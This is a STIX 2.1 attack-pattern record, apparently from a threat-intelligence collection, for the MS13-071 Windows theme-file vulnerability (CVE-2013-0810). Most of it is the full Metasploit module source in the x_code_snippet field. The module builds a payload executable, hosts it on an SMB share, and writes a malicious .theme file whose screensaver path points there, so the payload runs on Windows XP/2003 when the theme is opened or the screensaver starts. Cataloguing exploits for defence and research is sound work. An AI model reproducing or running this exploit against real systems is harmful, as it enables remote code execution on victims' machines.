{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99c1d43c-6f7c-4efa-8b95-d841905c5da6",
    "created": "2024-08-14T16:38:28.983754Z",
    "modified": "2024-08-14T16:38:28.983758Z",
    "name": "\"MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution\"",
    "description": " This module exploits a vulnerability mainly affecting Microsoft Windows XP and Windows 2003. The vulnerability exists in the handling of the Screen Saver path, in the [boot] section. An arbitrary path can be used as screen saver, including a remote SMB resource which allows for remote code execution when a malicious .theme file is opened, and the \"Screen Saver\" tab is viewed. The code execution is also triggered if the victim installs the malicious theme and stays away from the computer, when Windows tries to display the screensaver.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms13_071_theme.rb",
            "external_id": "ms13_071_theme.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0810"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=1040"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/09/25/change-the-theme-get-a-shell"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::SMB::Server::Share\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability mainly affecting Microsoft Windows XP and Windows\n        2003. The vulnerability exists in the handling of the Screen Saver path, in the [boot]\n        section. An arbitrary path can be used as screen saver, including a remote SMB resource,\n        which allows for remote code execution when a malicious .theme file is opened, and the\n        \"Screen Saver\" tab is viewed. The code execution is also triggered if the victim installs\n        the malicious theme and stays away from the computer, when Windows tries to display the\n        screensaver.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Eduardo Prado', # Vulnerability discovery\n          'juan vazquez', # Metasploit module\n          'Matthew Hall <hallm@sec-1.com>' # Metasploit module refactored to use Msf::Exploit::Remote::SMB::Server::Share\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-0810'],\n          ['OSVDB', '97136'],\n          ['MSB', 'MS13-071'],\n          ['BID', '62176'],\n          ['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=1040'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/09/25/change-the-theme-get-a-shell']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => false\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows XP SP3 / Windows 2003 SP2', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-09-10',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [true, 'The theme file', 'msf.theme']),\n          OptString.new('FILE_NAME', [ false, 'SCR File name to share', 'msf.scr'])\n        ])\n\n      deregister_options('FOLDER_NAME')\n      deregister_options('FILE_CONTENTS')\n  end\n\n  def primer\n    self.file_contents = generate_payload_exe\n    print_status(\"Malicious SCR available on #{unc}...\")\n\n    # Default Windows XP / 2003 theme modified\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    theme = <<-EOF\n; Copyright (c) Microsoft Corp. 1995-2001\n\n[Theme]\nDisplayName=@themeui.dll,-2016\n\n; My Computer\n[CLSID\\\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\\\DefaultIcon]\nDefaultValue=%WinDir%explorer.exe,0\n\n; My Documents\n[CLSID\\\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\\\DefaultIcon]\nDefaultValue=%WinDir%SYSTEM32\\\\mydocs.dll,0\n\n; My Network Places\n[CLSID\\\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\\\DefaultIcon]\nDefaultValue=%WinDir%SYSTEM32\\\\shell32.dll,17\n\n; Recycle Bin\n[CLSID\\\\{645FF040-5081-101B-9F08-00AA002F954E}\\\\DefaultIcon]\nfull=%WinDir%SYSTEM32\\\\shell32.dll,32\nempty=%WinDir%SYSTEM32\\\\shell32.dll,31\n\n[Control Panel\\\\Desktop]\nWallpaper=\nTileWallpaper=0\nWallpaperStyle=2\nPattern=\nScreenSaveActive=0\n\n[boot]\nSCRNSAVE.EXE=#{unc}\n\n[MasterThemeSelector]\nMTSM=DABJDKT\n    EOF\n    file_create(theme)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-10",
    "x_mitre_platforms": [
        "win'"
    ]
}